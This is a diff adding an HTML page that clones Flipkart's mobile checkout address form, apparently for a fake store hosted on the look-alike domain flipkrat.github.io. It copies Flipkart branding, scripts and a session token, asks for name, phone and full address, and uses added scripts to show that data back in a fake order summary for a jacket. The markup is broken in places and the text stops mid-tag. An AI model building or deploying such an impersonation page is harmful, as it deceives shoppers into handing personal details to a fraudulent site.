@@ -1,0 +1,623 @@
+<html lang="en-IN">
+ <head>
+  <title>Flipkart</title> 
+  <meta name="viewport" content="width=device-width, minimum-scale=1.0, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"> 
+  <meta http-equiv="Content-Type" content="text/html; charset=utf-8"> 
+  <meta name="theme-color" content="#2874f0"> 
+  <meta name="supported-color-schemes" content=""> 
+  <meta name="full-screen" content="yes"> 
+  <meta name="apple-mobile-web-app-capable" content="yes"> 
+  <meta name="mobile-web-app-capable" content="yes"> 
+  <meta name="apple-mobile-web-app-status-bar-style" content="#2874f0"> 
+  <meta name="apple-mobile-web-app-title" content="Flipkart"> 
+  <link rel="apple-touch-icon" href="https://img1a.flixcart.com/www/promos/new/20160610-194655-ios-logo.png" type="image/x-icon"> 
+  <meta http-equiv="X-UA-Compatible" content="IE=edge"> 
+  <!-- PREVENT UNWANTED FAVICON REQUEST --> 
+  <link rel="icon" href="data:;base64,iVBORw0KGgo="> 
+  <link href="https://img1a.flixcart.com" rel="dns-prefetch/"> 
+  <!-- PWA MANIFEST FOR ENABLING ADD TO HOMESCREEN --> 
+  <script type="text/javascript" crossorigin="anonymous" nonce="">
+
+		// app environment
+		window.appEnvironment = {"SN":"VI49AFAB1AB9EA432EA43D563B438AD6FF.TOK886BBC0454EF4E6BA18BEDB26D80ABD8.1629484883.LI","SC":"","fkUA":"Mozilla/5.0 (Linux; Android 10; RMX1827 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.159 Mobile Safari/537.36 FKUA/msite/0.0.1/msite/Mobile","fkLocale":"en","platform":"web","isLoggedIn":true,"nonce":"ckskp86pr1yta1rs3trxkl12c","abConfig":{"isSwatchExpanded":{"value":false,"abId":"ed813cf1","appId":"global"},"enableMrpSizeExptSPBPListView":{"value":false,"abId":"ed813cf1","appId":"global"},"reactNative.globalConfig.fontSizeExperiment.searchPageGridView.isEnabled":{"value":false,"abId":"ed813cf1","appId":"global"},"showRatingsOnCart":{"value":false,"abId":"ed813cf1","appId":"global"},"hideRupeeSymbolCart":{"value":false,"abId":"ed813cf1","appId":"global"},"minLimit":{"value":5,"abId":"ed813cf1","appId":"global"},"Header.X-PCD-TD0":{"value":true,"abId":"ed813cf1","appId":"global"},"hideRupeeSymbolPayment":{"value":false,"abId":"ed813cf1","appId":"global"},"reactNative.globalConfig.fontSizeExperiment.productPage.isEnabled":{"value":false,"abId":"ed813cf1","appId":"global"},"reactNative.globalConfig.fontSizeExperiment.cartPage.isEnabled":{"value":false,"abId":"ed813cf1","appId":"global"},"EnableBrandNameExpSP":{"value":false,"abId":"ed813cf1","appId":"global"},"showUrgency":{"value":true,"abId":"ed813cf1","appId":"global"},"enableMrpSizeExptPP":{"value":false,"abId":"ed813cf1","appId":"global"},"hideRupeeSymbolCheckout":{"value":false,"abId":"ed813cf1","appId":"global"},"showAmountInPriceDrop":{"value":false,"abId":"ed813cf1","appId":"global"},"reactNative.globalConfig.fontSizeExperiment.searchPageListView.isEnabled":{"value":false,"abId":"ed813cf1","appId":"global"},"maxLimit":{"value":19,"abId":"ed813cf1","appId":"global"},"enableMrpSizeExptOS":{"value":false,"abId":"ed813cf1","appId":"global"},"enableCartShowSimilarForOOS_FLIPKART_Android":{"value":false,"abId":"ed813cf1","appId":"global"},"enableMrpSizeExptCart":{"value":false,"abId":"ed813cf1","appId":"global"},"enableCartShowSimilarForOOS_FLIPKART_iOS":{"value":false,"abId":"ed813cf1","appId":"global"},"enableMrpSizeExptSPBPGridView":{"value":false,"abId":"ed813cf1","appId":"global"},"showUrgencyCallout":{"value":false,"abId":"ed813cf1","appId":"global"},"productDeliveryTimerColor":{"value":"#666666","abId":"ed813cf1","appId":"global"},"abIdsMap":{"ed813cf1":"global"}}};
+
+		// calculate first paint
+		window.requestAnimationFrame && window.requestAnimationFrame(function () {
+			window.performance && window.performance.mark && window.performance.mark('first_paint');
+			try { window.performance.timing.fkServerResponse = window.performance.timing.responseEnd-window.performance.timing.fetchStart; }catch (e) {}
+		});
+	</script> 
+  <style type="text/css">
+		body, html {margin: 0; padding: 0}
+		*{cursor:pointer;-webkit-tap-highlight-color:transparent;}
+		*:not(input):not(textarea):not(button){-webkit-touch-callout: none;-webkit-user-select: none;-moz-user-select: none;user-select: none;}
+		input[type="button"],input[type="submit"]{-webkit-appearance: none;}
+
+		/* Common Shell styles */
+		.loading-shell{
+			height:100%;
+			width: 100%;
+			background-color: #ffffff;
+			padding: 16px;
+		}
+
+		.loader .loading-strip.loading-strip, .loader.loading-strip {
+			color: transparent;
+			background-color: #eee;
+			transform : translateZ(0);
+			-webkit-transform : translateZ(0);
+			margin-bottom: 10px;
+		}
+
+		.loader .loading-strip::after, .loader.loading-strip::after {
+			content: '';
+			background-color: transparent;
+			background-image: -webkit-gradient(linear, left top, right top, color-stop(0%, transparent), color-stop(50%,rgba(255,255,255,0.75)), color-stop(100%, transparent));
+			background-repeat: no-repeat;
+			-webkit-animation: loading-shell 2s linear infinite;
+			position: absolute;
+			top: 0;
+			left: 0;
+			right: 0;
+			bottom: 0;
+
+		}
+		@-webkit-keyframes loading-shell {
+			0%{background-position: -500px 0}
+			100%{background-position: 500px 0}
+		}
+
+		.fake-header {
+			background: #2874f0;
+			font-size: 1pc;
+			display: table;
+			table-layout: fixed;
+			width: 100%;
+			height: 52px;
+			color: #eaeaea;
+		}
+
+		.fake-header-items {
+			display: table-cell;
+			vertical-align: middle;
+			text-align: center;
+			width: 42px;
+			line-height: 10px;
+			position: relative;
+			overflow: hidden;
+		}
+
+		.fake-header-title {
+			display: table-cell;
+			vertical-align: middle;
+			padding: 5px 0;
+			text-align: left;
+			overflow: hidden;
+			text-overflow: ellipsis;
+			width: 100%;
+			white-space: nowrap;
+			font-size: 1pc;
+			padding-left: 9pt;
+		}
+	</style> 
+  <link href="//img1a.flixcart.com/www/linchpin/checkout/app.e771194bab125412f38e.css" rel="stylesheet" type="text/css">
+  <link href="//img1a.flixcart.com/www/linchpin/checkout/common.d74e15bdc242864203a8.css" rel="stylesheet" type="text/css">
+  <link rel="stylesheet" type="text/css" href="//img1a.flixcart.com/www/linchpin/checkout/createaddress.cdf7e9fe3a83205bb703.css"> 
+ </head> 
+ <body style="overflow: auto;"> 
+  <!-- SENTRY -->  <h200 id="adr"style="display:n">
+  <script type="text/javascript" crossorigin="anonymous" nonce="">
+
+            if (window.Sentry) {
+                try {
+                    var config = {
+                        dsn: 'https://20ff5957940d464eb6097afa976a2acf@sentry.flipkart.com/43',
+                        environment: 'prod'
+                    };
+                        config.release = '3.4.140';
+
+                    window.Sentry.init(config);
+                    window.addEventListener('unhandledrejection', function(event) {
+                        window.Sentry.captureException(event.reason);
+                    });
+                } catch(e) {
+                    console.log('Sentry not available.', e);
+                }
+            } else {
+                console.log('Sentry not available.');
+            }
+
+        </script> 
+  <!-- CSS --> 
+  <script type="text/javascript" crossorigin="anonymous" nonce="">
+	// load styles sheets
+	function loadStyleSheet(src){
+		if (document.createStyleSheet) document.createStyleSheet(src);
+		else {
+			var stylesheet = document.createElement('link');
+			stylesheet.href = src;
+			stylesheet.rel = 'stylesheet';
+			stylesheet.type = 'text/css';
+			document.getElementsByTagName('head')[0].appendChild(stylesheet);
+		}
+	}
+
+		loadStyleSheet('//img1a.flixcart.com/www/linchpin/checkout/app.e771194bab125412f38e.css');
+		loadStyleSheet('//img1a.flixcart.com/www/linchpin/checkout/common.d74e15bdc242864203a8.css');
+</script> 
+  <!-- FLAGS --> 
+  <script type="text/javascript" crossorigin="anonymous" nonce="">
+	// global flags
+	window.jsFlags = {};
+	window.jsChunks = {};
+	window.cssChunks = {};
+	window.chunks = {};
+	try {
+		window.jsFlags = {"showGroceryAddressMessage":true,"showGroceryD2R":true,"showSuggestAddressPopup":true,"showFlipkartAddressMessage":false,"lcaMapRedirectEnabled":true,"isHeliosEnabled":{"android":true,"ios":true,"web":true},"logApiErrors":true,"disableIosHeliosBridge":false,"abOverrides":{"progressFeedbackEnabled":"true","enableMapGrocery":true,"umlbutton_min":true},"enableHyperLocal":true,"iosBridgeTimeout":750,"enableCryspCall":false,"cryspASPLimit":2000,"cryspSDKUrl":"https://img1a.flixcart.com/batman-returns/batman-returns/CryspSDK6.min.js"};
+		window.jsChunks = {"ordersummary":"//img1a.flixcart.com/www/linchpin/checkout/ordersummary.05a78e3d880cb9f9bcf3.js","createaddress":"//img1a.flixcart.com/www/linchpin/checkout/createaddress.f758a85f748d376d3013.js","pickupstore":"//img1a.flixcart.com/www/linchpin/checkout/pickupstore.3ab96c1b560efdaf8562.js","cart":"//img1a.flixcart.com/www/linchpin/checkout/cart.1925b05d6cb26b63b7b7.js","changeaddress":"//img1a.flixcart.com/www/linchpin/checkout/changeaddress.4acbf637cd94384c7ac7.js","assuredbuyback":"//img1a.flixcart.com/www/linchpin/checkout/assuredbuyback.dde7be9b93e805b8e9d4.js","app":"//img1a.flixcart.com/www/linchpin/checkout/app.9910cbff66f8de937f3e.js"};
+		window.cssChunks = {};
+		window.chunks = {"en":{"js":["//img1a.flixcart.com/www/linchpin/checkout/en.3902bc25e952d2230d2a.js"],"css":[]},"hi":{"js":["//img1a.flixcart.com/www/linchpin/checkout/hi.d5cb6621d9bc5b6872a8.js"],"css":[]},"ta":{"js":["//img1a.flixcart.com/www/linchpin/checkout/ta.b5eb70ea130441885c67.js"],"css":[]},"te":{"js":["//img1a.flixcart.com/www/linchpin/checkout/te.011c117ee62af083f373.js"],"css":[]},"kn":{"js":["//img1a.flixcart.com/www/linchpin/checkout/kn.e4e1a01371a228fd7695.js"],"css":[]},"mr":{"js":["//img1a.flixcart.com/www/linchpin/checkout/mr.de51688e18415b441365.js"],"css":[]},"or":{"js":["//img1a.flixcart.com/www/linchpin/checkout/or.01fa1adbecf7595ed5a5.js"],"css":[]},"bn":{"js":["//img1a.flixcart.com/www/linchpin/checkout/bn.1b660d5196348c9b69a4.js"],"css":[]},"gu":{"js":["//img1a.flixcart.com/www/linchpin/checkout/gu.d0587f3430f27abd05b0.js"],"css":[]},"pa":{"js":["//img1a.flixcart.com/www/linchpin/checkout/pa.65569ee6a217ba6af954.js"],"css":[]},"as":{"js":["//img1a.flixcart.com/www/linchpin/checkout/as.82ae0e15133f2301c491.js"],"css":[]},"ml":{"js":["//img1a.flixcart.com/www/linchpin/checkout/ml.8cd05f78a5771b5838a5.js"],"css":[]},"cart":{"js":["//img1a.flixcart.com/www/linchpin/checkout/cart.402f369aaf3e5fdd4a17.js"],"css":["//img1a.flixcart.com/www/linchpin/checkout/cart.9293d9295bf211ddae48.css"]},"ordersummary":{"js":["//img1a.flixcart.com/www/linchpin/checkout/ordersummary.989c1e399476aa27d449.js"],"css":["//img1a.flixcart.com/www/linchpin/checkout/ordersummary.e3e55faa3d3082ae9484.css"]},"changeaddress":{"js":["//img1a.flixcart.com/www/linchpin/checkout/changeaddress.5f1768ce750cf049e56c.js"],"css":["//img1a.flixcart.com/www/linchpin/checkout/changeaddress.6467f8e9794fdfe6ea84.css"]},"createaddress":{"js":["//img1a.flixcart.com/www/linchpin/checkout/createaddress.02e3cba63807ea2d38cf.js"],"css":["//img1a.flixcart.com/www/linchpin/checkout/createaddress.cdf7e9fe3a83205bb703.css"]},"pickupstore":{"js":["//img1a.flixcart.com/www/linchpin/checkout/pickupstore.befb983cebf7faca7cef.js"],"css":["//img1a.flixcart.com/www/linchpin/checkout/pickupstore.474851b6eccb55541a2d.css"]},"assuredbuyback":{"js":["//img1a.flixcart.com/www/linchpin/checkout/assuredbuyback.ca34331bbf5145544b7b.js"],"css":["//img1a.flixcart.com/www/linchpin/checkout/assuredbuyback.a9c855b3d23eafdb904f.css"]}};
+	}
+	catch (e){
+	}
+</script> 
+  <script crossorigin="anonymous" nonce="">
+		window.omniture={tpv:[],tl:[]};
+		window.omniture.trackPageView=function(){window.omniture.tpv.push(arguments)};
+		window.omniture.trackLink=function(){window.omniture.tl.push(arguments)};
+	window.s_account = 'flipkart-mob-web';
+	window.omnitureSamplingBucketId = 28;
+	window.omnitureIngestionEnabled = true;
+</script> 
+  <!-- JS in body --> 
+  <!-- MAIN CHUNK --> 
+  <!-- Omniture --> 
+  <!-- MOCKS --> 
+  <script crossorigin="anonymous" nonce="">
+	window.URLQueryParams = function(query){
+		var queryObj={};
+		if(query){
+			var items = query.substring(1).split("&");
+			for(var i=0; i < items.length; i++){
+				var queryItem = items[i];
+				var kvPair = queryItem.split("=");
+				queryObj[kvPair[0]] = kvPair[1];
+			}
+		}
+		return queryObj;
+	};
+	var queryParams = window.URLQueryParams(window.location.href);
+	if (queryParams && queryParams.cmpid && /^EM-OW/.test(queryParams.cmpid)) {
+		window.omniture.trackLink({
+			"events": "event1",
+			"eVar45": queryParams.cmpid
+		});
+	}
+</script> 
+  <div id="fk-cp-checkout">
+   <div>
+    <div class="_21I5uf">
+     <span class="_2aCGoL" ></span>
+    </div>
+    <div>
+     <div class="VnZw8B" style="background-color: rgb(40, 116, 240);">
+      <a href="https://flipkrat.github.io/flipkart/"><img src="//img1a.flixcart.com/www/linchpin/checkout/back-e9e0ceba.svg" style="margin-top:18px;margin-left:15px"></a>
+      <div class="RcJR_D"><div style="margin-left:40px">
+    Add delivery address
+      </div>
+     </div>
+     <div>
+      
+      
+      
+      </div>
+     </div>
+     <div class="_1-JgbN">
+      <img src="//img1a.flixcart.com/www/linchpin/checkout/progress-indicator-address-4dd07a71.svg" class="BEFj7t">
+     </div>
+     <div>
+      <div></div>
+      <div class="_3YEz5Y">
+       <form class="_1HKanm" method="" id="" data-omniture="">
+        <div>
+         <div class="_29c-ns _1CtMQn _19jXxw">
+          <div class="_3ZEfqN">
+           <div class="_3xNCye">
+            <label class="_1RzPyY"> <div>
+             
+     
+             </div></label>
+            <input data-labelname="[object Object]" placeholder="Full Name (Required)  *"data-elementtype="text" id="in1" pattern="^[]*[.]*[-]*[a-zA-Z]+[a-zA-Z \s&amp;.-]*$" maxlength="300" data-prefilledvalue="" required class="_2Ck2Ek" name="name" autocomplete="off" autocorrect="off" type="text" value="" style="height: 17px;">
+           </div>
+           <div style="opacity: 0; max-height: 0px;">
+            <div class="p2zycy"> 
+            </div>
+           </div>
+          </div>
+          <div class="_3ZEfqN _39Cuz8">
+           <div class="_3xNCye">
+            <label class="_1RzPyY" for="phone">
+             <div>
+              
+              
+             </div></label>
+            <input data-labelname="[object Object]" placeholder="  Phone number (Required)  *"data-elementtype="tel" id="in2" data-prefilledvalue="" required pattern="^[0-9]{10}$" class="_2Ck2Ek" name="phone" autocomplete="off" autocorrect="off" type="tel" value="" style="height: 17px;">
+           </div>
+           <div style="opacity: 0; max-height: 0px;">
+            <div class="p2zycy"> 
+            </div>
+           </div>
+          </div>
+          <div class="_3ZEfqN QKacIb">
+           <div class="_3xNCye">
+            <label class="_1RzPyY" for="alternatePhone">Add Alternate Phone Number</label>
+            <input data-labelname="Add Alternate Phone Number" data-elementtype="number" id="alternatePhone" data-prefilledvalue="" pattern="^[0-9]{10}$" data-customerror="Enter a 10-digit phone number" class="_2Ck2Ek" name="alternatePhone" autocomplete="off" autocorrect="off" type="number" value="">
+           </div>
+           <div style="opacity: 1; max-height: 50px; transition: opacity 400ms ease-in-out 0s, max-height 400ms ease-in-out 0s;">
+            <div class="p2zycy"> 
+            </div>
+           </div>
+          </div>
+         </div>
+         <div class="_29c-ns _3sVoLS _19jXxw">
+          <div>
+           <div>
+            <div class="h8BqSC _2mhlq1 _2Pze8g">
+             Please provide location permission to Flipkart app
+            </div>
+            <div class="_3fhcTO">
+             <div class="_226P_g D7u1cs _1uOoge">
+              <div class="_3ZEfqN _39Cuz8">
+               <div class="_3xNCye">
+                <label class="_1RzPyY" for="pincode">
+                 <div>
+                  
+                 </div></label>
+                <input data-labelname="[object Object]" onkeyup="on()" placeholder=" Pincode (Required)  *"data-elementtype="number" pattern="^[1-9][0-9]{5}$" maxlength="6" id="in3" data-minlength="6" data-prefilledvalue="" data-focusthisfield="false" required class="_2Ck2Ek" name="pincode" autocomplete="off" autocorrect="off" type="number" value="" style="height: 17px;">
+               </div>
+               <div style="opacity: 0; max-height: 0px;">
+                <div class="p2zycy"> 
+                </div>
+               </div>
+              </div>
+             </div>
+             <div class="_3nej5_">
+              <div class="_1aBKRT _2E-vP6">
+               <div class="_35VEvE">
+                <div class="_2PtyR8">
+                 <img class="_3Syggg" src="//img1a.flixcart.com/www/linchpin/checkout/mylocationAB-ee92a46c.svg" width="18" height="18">
+                 <div class="W-TPaR _279B1i">
+                  Use my location
+                 </div>
+                </div>
+               </div>
+              </div>
+             </div>
+            </div>
+           </div>
+           <div class="deqkCc _9GhEjI">
+            <div class="_226P_g D7u1cs _1uOoge">
+             <div class="NOHJeo">
+              <img src="//img1a.flixcart.com/www/linchpin/checkout/search-ceea5fbc.svg" class="_1Fs6kX U2hrsP">
+              <div class="_3ZEfqN">
+               <div class="_3xNCye">
+                <label class="_1RzPyY" for="city">
+                 <div>
+                
+                  
+                 </div></label>
+                <input data-labelname="[object Object]" placeholder="  City (Required)  *"class="_2Ck2Ek NUlC8R" autocomplete="off" autocorrect="off" data-focusthisfield="false" data-elementtype="text" id="in4" pattern="^[A-Za-z]+[\s\w\d\\\.,&amp;\(\)]*" maxlength="100" data-minlength="1" data-prefilledvalue="" required name="city" type="text" value="" style="height: 17px;">
+               </div>
+               <div style="opacity: 0; max-height: 0px;">
+                <div class="p2zycy"> 
+                </div>
+               </div>
+              </div>
+             </div>
+            </div>
+            <div class="_226P_g D7u1cs _1uOoge">
+             <div class="_3ZEfqN">
+              <div class="_3xNCye">
+               <label class="_1RzPyY" for="state">
+                <div>
+                
+                
+                </div></label>
+               <input data-labelname="[object Object]" placeholder=" State (Required)  *"  pattern="^[]*[.]*[-]*[a-zA-Z]+[a-zA-Z \s&amp;.-]*$" data-elementtype="text" id="state" data-prefilledvalue="" required class="_2Ck2Ek" name="state" autocomplete="off" autocorrect="off" type="text" value="" style="height: 17px;">
+              </div>
+              <div style="opacity: 0; max-height: 0px;">
+               <div class="p2zycy"> 
+               </div>
+              </div>
+             </div>
+            </div>
+           </div>
+           <div class="NOHJeo">
+            <div class="_3ZEfqN">
+             <div class="_3xNCye">
+              <label class="_1RzPyY" for="addressLine1">
+               <div>
+                
+                
+               </div></label>
+              <textarea data-labelname="[object Object]" class="_2Ck2Ek NUlC8R" placeholder="House No., Building Name (Required)  *" autocomplete="off" autocorrect="off" data-elementtype="textarea" id="in5" maxlength="200" data-prefilledvalue="" required name="addressLine1" rows="1" style="height: 16px;"></textarea>
+             </div>
+             <div style="opacity: 0; max-height: 0px;">
+              <div class="p2zycy"> 
+              </div>
+             </div>
+            </div>
+           </div>
+           <div class="NOHJeo">
+            <img src="//img1a.flixcart.com/www/linchpin/checkout/search-ceea5fbc.svg" class="_1Fs6kX U2hrsP">
+            <div class="_3ZEfqN">
+             <div class="_3xNCye _19sjab">
+              <label class="_1RzPyY" for="addressLine2">
+               <div>
+               </div></label>
+              <textarea data-labelname="[object Object]" placeholder=" Road name, Area, Colony (Required)  *" class="_2Ck2Ek NUlC8R" autocomplete="off" autocorrect="off" data-elementtype="textarea" id="in6" maxlength="200" data-minlength="1" data-prefilledvalue="" required data-enabletextcounter="false" name="addressLine2" rows="1" style="height: 16px;"></textarea>
+             </div>
+             <div style="opacity: 0; max-height: 0px;">
+              <div class="p2zycy"> 
+              </div>
+             </div>
+            </div>
+           </div>
+           <div class="_3ZEfqN QKacIb lgP9vP">
+            <div class="_3xNCye">
+             <label class="_1RzPyY" for="landmark">Add Nearby Famous Shop/Mall/Landmark</label>
+             <textarea data-labelname="Add Nearby Famous Shop/Mall/Landmark" data-elementtype="textarea" id="landmark" maxlength="300" data-prefilledvalue="" class="_2Ck2Ek" name="landmark" autocomplete="off" autocorrect="off" rows="1"></textarea>
+            </div>
+            <div style="opacity: 1; max-height: 50px; transition: opacity 400ms ease-in-out 0s, max-height 400ms ease-in-out 0s;">
+             <div class="p2zycy"> 
+             </div>
+            </div>
+           </div>
+          </div>
+         </div>
+         <div class="_29c-ns _30vXkM _19jXxw">
+          <div class="_1xMS0O" id="locationTypeTag">
+           Type of address 
+          </div>
+          <div class="_2Z7mA4">
+           <a class="_26eWbS _2E-IXA"><input type="radio" class="_2bhVl9" name="locationTypeTag" id="locationTypeTag" value="HOME">
+            <div class="_11tYgT _3pLaKS _2mep_U undefined">
+             <div class="_1iTi6x">
+              <div class="_3xKZ3B">
+               <img src="//img1a.flixcart.com/www/linchpin/checkout/address_home_selected-d9985852.svg" class="JdtzbP _7orDsO">Home
+              </div>
+             </div>   
+            </div>
+           <a class="_26eWbS _1hGxGR"><input type="radio" class="_2bhVl9" name="locationTypeTag" id="locationTypeTag" value="WORK">
+            <div class="_11tYgT _3pLaKS _2mep_U undefined">
+             <div class="_1iTi6x">
+              <div class="_3xKZ3B">
+               <img src="//img1a.flixcart.com/www/linchpin/checkout/business_center-784289ae.svg" class="JdtzbP _7orDsO">
+               <img src="//img1a.flixcart.com/www/linchpin/checkout/business_center_selected-20d0616e.svg" class="JdtzbP">Work
+              </div>
+             </div>
+            </div></a> <form>
+        <input type="submit" value="" onclick="hid()"style="height:47px;:px;background-color:#FF5800;position:absolute;top:70px;width:90%;margin-bottom:30px;border-radius:2px;border:none; font-size:15px;"> <h2 onclick="hide()"style="color:white;font-size:16px; position:absolute;top:83px;left:52%;padding-left:110px;background-color:g;padding-right:110px;padding-top:15px;padding-bottom:10px;left:19px;margin-top:-15px;bottom:px;"><strong>Save Address </strong></h2> </form><br> <br><br>
+         
+         </div>
+         </div>
+        </div>
+       </form>
+      </div>
+     </div>
+    </div>
+    <div>
+     <div class="UNAt1v">
+      <div class="FvBF2i">
+       <div class="TDfsHK"></div>
+       <div class="_2ivGnN">
+        Please rotate your device
+       </div>
+       <div class="_3qKOBd">
+        We don't support landscape mode yet. Please go back to portrait mode for the best experience
+       </div>
+      </div>
+     </div>
+    </div>
+   </div><div style="padding:20px;width:100%;">kakajsjsjsjshsh</div>
+  </div> </h200>
+  
+  
+    
+  <h100 id="sum" style="width:;display:none;margin-left:6px;background-color:">
+    
+    
+  <script type="text/javascript" charset="utf-8">
+    function hide(){
+	 
+            
+      var bot0 = document.getElementById('adr').style.display ='none';
+    
+    
+      var bot = document.getElementById('sum').style.display ='block';
+      
+     window.location='#yt';
+      
+      
+      
+      var m1 = document.getElementById("in1").value;
+            p11.innerHTML= m1;
+          
+          var m2 = document.getElementById("in5").value;
+            p2.innerHTML= m2;
+      
+var m3 = document.getElementById("in6").value;
+            p3.innerHTML= m3;
+
+var m4 = document.getElementById("in4").value;
+            p4.innerHTML= m4;
+          
+   var m5 = document.getElementById("in3").value;
+            p5.innerHTML= m5;
+      
+var m6 = document.getElementById("in2").value;
+            p6.innerHTML= m6;
+      
+    }
+  </script>
+  
+  
+  <div >
+  
+  <button class="_1q5BS3"style="margin-right:px;position:relative;background-color:#2873F0;border:.5px solid gray;width:114%;height:52px;margin-bottom:3px;border-radius:2px;margin-right:px; right:25px;"><p id="yt"style="color:white;margin-right:115px; font-size:16px; bottom:px;">Order Summary</p></h3></div></div>
+
+  
+  <a href="https://flipkrat.github.io/flipkart/">
+    
+    <img src="//img1a.flixcart.com/www/linchpin/checkout/back-e9e0ceba.svg" style="margin-left:15px;background-color:;position:relative;bottom:37px"/></a>
+    
+    
+<div class="css-1dbjc4n r-1awozwy r-1777fci r-1udh08x" style="width: 360px;"><div style="display: flex; position: relative; width: 360px; height: 60px;"><img src="https://rukminim1.flixcart.com/www/750/150/promos/31/03/2021/c9db80b9-c9b0-40f2-925e-e94fc956b273.png?q=90" loading="lazy" alt="" style="width: 100%; height: 100%; margin: auto; object-fit: cover; opacity: 1;"><img src="https://static-assets-web.flixcart.com/www/linchpin/batman-returns/images/fk-default-image-75ff340b.png?q=90" loading="lazy" style="width: 100%; height: 100%; margin: auto; position: absolute; inset: 0px; padding: inherit; object-fit: cover; opacity: 0;"></div></div></div></div></div>
+
+
+<div class="css-1dbjc4n" style="background-color:rgba(240,240,240,1.00);height:11px;margin-right:-20px;margin-left:-20px;margin-top:10px;margin-bottom:10px"></div> 
+<div style="margin-left:10px;color:black; opacity:0.9;max-hight:40px;"> 
+<div id="p11" style="font-size:16px;margin-bottom:8px;margin-top:12px;font-family:bold;color:;background-color:j"></div> <verdana>
+  <div id="p2"style="font-size:14.2px;font-family:;background-color:j;">,</div><div id="p3"style="font-size:14.5px;background-color:;margin-bottom:px;background-color:;"> </div><div style="display:flex">
+<div id="p4"style="font-size:14.2px;background-color:;margin-right:2px"></div>
+-<div id="p5"style="font-size:14.2px;font-family:Helvetica;background-color:;margin-left:2px;background-color:j"></div>  </div>
+<div id="p6"style="font-size:14.2px;margin-bottom:7px;background-color:j"></div>
+
+</div></verdana>
+
+<div style="background-color:j;">
+</div></div></div><div> <br><br><button id="bot" onclick="fe()" style="margin-left:10px;background-color:#2873F0;border:.5px solid gray;width:93%;height:35px;margin-bottom:3px;border-radius:2px; "><b><p id="p1" style="text-align:center;font-size:14px;color:white;margin-top:7px;background-color:j">Change or Add Address</p></b></bottom></p></div></div></div></div>
+</div>
+<script type="text/javascript" charset="utf-8">
+  function fe(){ 
+      var k = document.getElementById('adr').style.display ='block';
+    
+    
+      var l = document.getElementById('sum').style.display ='none';}
+</script>
+
+<div class="css-1dbjc4n" style="background-color:rgba(240,240,240,1.00);height:10px;margin-right:-20px;margin-left:-20px;margin-top:10px;margin-bottom:10px"></div>
+
+<div class="css-1dbjc4n r-t7x54m" style="max-width: ;position:relative;"><div style="padding:px;border:2px solid gray;width:16px;height:16px;position:absolute;top:6px;left:8px"></div><div dir="auto" class="css-901oao css-cens5h r-1vgyyaa r-1b43r93 r-1rsjblm r-rjixqe" style="-webkit-line-clamp: 2;color:black;float:right;margin-top:5px;font-family:;font-size:13.3px;position:absolute;left:35px;top:2px;background-color:j"><strong>Contribute ₹10 for the COVID-19 fundraiser</strong></div></div></div></div></div><br><br>
+
+
+<div style="background-color: rgb(244, 248, 255);height:px;;margin:7px;border-radius:3px"><div style="display: flex; position: relative; width: 36px; height: 36px;"><img src="https://rukminim1.flixcart.com/www/80/80/promos/05/05/2021/ffcaab0d-e9a3-442b-ab25-0aeab1f71ac3.png?q=90" loading="lazy" alt="" style="width: 100%; height: 100%; margin: auto; object-fit: contain; opacity: 1;position:absolute;top:7px;left:7px"><img src="https://static-assets-web.flixcart.com/www/linchpin/batman-returns/images/fk-default-image-75ff340b.png?q=90" loading="lazy" style="width: 100%; height: 100%; margin: auto; position:absolute; inset: 0px; padding: inherit; object-fit: contain; opacity: 0;"></div><div style="position:relative"></div><div richtextdata="[object Object]" dir="auto" class="css-901oao r-1vgyyaa r-1enofrn r-1rsjblm r-14yzgew r-1jkjb" style="background-color: rgba(0, 0, 0, 0); color: rgb(135, 135, 135);position:relative;margin-left:15%;margin-bottom:px;font-size:12.5px;top:-20px;font-family:;background-color:j"><strong>Support GiveIndia's COVID-19 relief work</strong></div></div><div dir="auto" class="css-901oao r-1et8rh5 r-1enofrn r-1s2bzr4" style="font-size:12px;margin-top:10px;margin-bottom:10px;background-color:j">Note: GST Invoice and No-Cost EMI offers are not applicable</div></div>
+
+
+  
+  
+
+<div class="css-1dbjc4n" style="background-color:rgba(240,240,240,1.00);height:10px;margin-right:-20px;margin-left:-20px;margin-top:10px;margin-bottom:10px"></div>
+<div style="width:100%;height:190px">
+<div class="css-1dbjc4n"style="position:relative"><div><div class="css-1dbjc4n r-18u37iz r-1wtj0ep r-15zivkp r-1ow6zhx r-88pszg r-1wzrnnt"><div class="css-1dbjc4n r-1habvwh r-eqz5dr r-1h0z5md"><div text="ARBIA FUNKI Full Sleeve Washed....." dir="auto" class="css-901oao css-bfa6kz r-cqee49 r-1et8rh5 r-ubezar" style="width: 70%px; font-size:16px;font-family:Helvetica;margin-left:7px;margin-top:15px;background-color:j">ARBIA FUNKI Full Sleeve Washed...</div><div text="Size: medium" dir="auto" class="css-901oao css-bfa6kz r-1h7g6bg r-1enofrn r-kc8jnq" style="width: 248px;font-size:13px;margin-top:7px;opacity:.5;margin-left:7px">Size: Medium </div><div class="css-1dbjc4n r-1awozwy r-18u37iz r-1777fci r-tskmnb"><div text="Seller:ARBIAFUNKI" dir="auto" class="css-901oao css-bfa6kz r-1h7g6bg r-1et8rh5 r-1enofrn r-1kb76zh" style="max-width: 160px;font-size:13px;opacity:.5;margin-top:7px;margin-left:7px">Seller:ARBIAFUNKI </div> 
+
+ <div style="display: flex; position: relative; height: 16px; width: 59px;left:128px;bottom:15px"><img src="https://rukminim1.flixcart.com/www/150/40/promos/30/11/2018/778ef6b8-125a-476d-8203-a5f7da499171.png?q=90" loading="lazy" alt="" style="width: 100%; height: 100%; margin: auto; object-fit: contain; opacity:1 ;"><img src="https://static-assets-web.flixcart.com/www/linchpin/batman-returns/images/fk-default-image-75ff340b.png?q=90" loading="lazy" style="width: 100%; height: 100%; margin: auto; position: absolute; inset: 0px; padding: inherit; object-fit: contain; opacity: 0;left:px"></div></div></div><div class="css-1dbjc4n r-1awozwy r-18u37iz r-wy61xf r-1777fci r-1glkqn6"><div style="display: flex; position: relative; margin-left: 0px; width: 72px; height: 72px;"><img src="https://rukminim1.flixcart.com/image/150/150/k41mp3k0/jacket/9/2/y/xl-denim-jacket-07-arbia-fanki-original-imafnfpfh45hytbj.jpeg?q=90" loading="lazy" alt="" style="width: 100%; height: 100%; margin: auto; object-fit: contain; opacity: 1;position:absolute;left:258px;bottom:80px;background-color:j"><img src="https://static-assets-web.flixcart.com/www/linchpin/batman-returns/images/fk-default-image-75ff340b.png?q=90" loading="lazy" style="width: 100%; height: 100%; margin: auto; position: absolute; inset: 